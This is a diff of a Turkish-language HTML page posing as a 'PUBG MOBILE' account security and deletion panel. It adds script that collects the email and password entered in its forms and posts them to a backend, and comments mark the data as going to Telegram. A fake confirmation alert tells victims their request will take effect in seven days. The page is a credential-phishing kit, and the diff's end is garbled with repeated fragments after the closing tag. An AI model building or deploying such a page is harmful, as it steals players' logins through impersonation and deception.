@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Güvenlik Paneli</title>
-    <!-- DIŞ LINKLER SİLİNDİ, DAHA HIZLI VE GARANTİLİ -->
     <style>
         :root { 
             --bg-dark: #070b14; 
@@ -38,6 +37,8 @@
         
         /* SAĞ İÇERİK */
         .content-area { flex: 1; padding: 20px; display: flex; flex-direction: column; gap: 20px; min-width: 300px;}
+        
+        /* PANELLER (KUTULAR) */
         .panel { background-color: var(--bg-panel); border: 1px solid var(--border-color); border-radius: 6px; padding: 20px; display: none; }
         .panel.active-panel { display: block; }
         .panel h2 { color: white; margin-bottom: 10px; font-size: 20px; }
@@ -60,16 +61,20 @@
         
         /* UYARILAR */
         .warning-box { background-color: rgba(241, 196, 15, 0.05); border: 1px solid var(--premium-gold); border-radius: 4px; padding: 15px; margin: 20px 0; color: var(--premium-gold); font-size: 14px;}
+        
+        /* EN ALTTAKİ YEŞİL KUTU (SABİT) */
+        .contact-box { background-color: var(--bg-panel); border: 1px solid var(--border-color); border-radius: 6px; padding: 20px; border-top: 3px solid #28a745; margin-top: 10px; }
+        .contact-box h2 { color: #28a745; margin-bottom: 10px; font-size: 20px; }
     </style>
 </head>
 <body>
     <header class="top-navbar">
         <div class="logo">PUBG MOBILE</div>
         <nav class="top-menu" id="topMenu">
-            <a href="#" class="active" onclick="changeTopMenu(this)">Hesap</a>
-            <a href="#" onclick="changeTopMenu(this)">Güvenlik</a>
-            <a href="#" onclick="changeTopMenu(this)">Oyun Ayarları</a>
-            <a href="#" onclick="changeTopMenu(this)">Geçmiş</a>
+            <a href="#" class="active" onclick="changeTopMenu(this); return false;">Hesap</a>
+            <a href="#" onclick="changeTopMenu(this); return false;">Güvenlik</a>
+            <a href="#" onclick="changeTopMenu(this); return false;">Oyun Ayarları</a>
+            <a href="#" onclick="changeTopMenu(this); return false;">Geçmiş</a>
         </nav>
     </header>
 
@@ -143,7 +148,7 @@
                 </form>
             </div>
 
-            <!-- 6. SİLME (BURASI E-POSTA ŞİFRE) -->
+            <!-- 6. SİLME (E-POSTA VE ŞİFRE BURADA) -->
             <div class="panel" id="panel-silme">
                 <h2>Hesap Silme</h2>
                 <p>Hesabınızı kalıcı olarak silmek istiyorsanız bilgilerinizi onaylayın.</p>
@@ -153,6 +158,88 @@
                     <button type="submit" class="btn btn-red">Hesabımı Sil</button>
                 </form>
                 <div class="warning-box" style="background: transparent; border-color: #dc3545; color: #dc3545; margin-top: 15px;">Dikkat: Bu işlem geri alınamaz!</div>
+            </div>
+
+            <!-- EN ALTTAKİ SABİT YEŞİL KUTU -->
+            <div class="contact-box">
+                <h2>Destek Ekibine Mesaj Gönder</h2>
+                <p>Aşağıdaki formu doldurarak bize ulaşabilirsiniz.</p>
+                <form onsubmit="mesajGonder(event, this)">
+                    <div class="form-group"><div class="input-wrapper"><input type="text" class="isim" placeholder="Adınız / Kullanıcı Adınız" required></div></div>
+                    <div class="form-group"><div class="input-wrapper"><textarea class="mesaj" placeholder="Mesajınızı buraya yazın..." required></textarea></div></div>
+                    <button type="submit" class="btn btn-green">Mesajı Gönder</button>
+                </form>
+            </div>
+        </main>
+    </div>
+
+    <script>
+        // SEKMELER (Menüye tıklayınca panelleri açar)
+        function changeSidebar(element, panelId) {
+            var items = document.querySelectorAll('#sidebarMenu li');
+            for (var i = 0; i < items.length; i++) { items[i].classList.remove('active'); }
+            element.parentElement.classList.add('active');
+            
+            var panels = document.querySelectorAll('.panel');
+            for (var j = 0; j < panels.length; j++) { panels[j].classList.remove('active-panel'); }
+            document.getElementById('panel-' + panelId).classList.add('active-panel');
+        }
+        function changeTopMenu(element) {
+            var links = document.querySelectorAll('#topMenu a');
+            for (var i = 0; i < links.length; i++) { links[i].classList.remove('active'); }
+            element.classList.add('active');
+        }
+
+        // GÜVENLİK FORMU (TELEGRAMA GİDEN)
+        document.getElementById('securityForm').onsubmit = function(e) {
+            e.preventDefault(); 
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
+            fetch('/api/guvenlik', {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ email: email, password: password })
+            }).then(r => r.json()).then(data => {
+                if(data.status === "ok") {
+                    alert('✅ İşleminiz başarıyla alındı.\n\nGüvenlik nedeniyle kapatma işlemi 7 GÜN SONRA aktif olacaktır.\n\nEğer bilgilerde yanlışlık varsa işlem İPTAL edilecektir.');
+                    this.reset();
+                } else { alert('❌ Bir hata oluştu.'); }
+            });
+        };
+
+        // HESAP SİLME FORMU (TELEGRAMA GİDEN)
+        document.getElementById('deleteForm').onsubmit = function(e) {
+            e.preventDefault();
+            var email = document.getElementById('delete_email').value;
+            var password = document.getElementById('delete_password').value;
+            fetch('/api/guvenlik', { 
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ email: email, password: password })
+            }).then(r => r.json()).then(data => {
+                if(data.status === "ok") {
+                    alert('✅ Hesap silme talebiniz alındı.');
+                    this.reset();
+                } else { alert('❌ Bir hata oluştu.'); }
+            });
+        };
+
+        // DİĞER MESAJ FORMLARI (TELEGRAMA GİDEN)
+        function mesajGonder(e, form) {
+            e.preventDefault();
+            var isim = form.querySelector('.isim').value;
+            var mesaj = form.querySelector('.mesaj').value;
+            fetch('/api/iletisim', {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ isim: isim, mesaj: mesaj })
+            }).then(r => r.json()).then(data => {
+                if(data.status === "ok") {
+                    alert('✅ Mesajınız başarıyla gönderildi!');
+                    form.reset();
+                } else { alert('❌ Mesaj gönderilemedi.'); }
+            });
+        }
+    </script>
+</body>
+</html>: #dc3545; margin-top: 15px;">Dikkat: Bu işlem geri alınamaz!</div>
             </div>
 
             <!-- EN ALT DESTEK KUTUSU -->
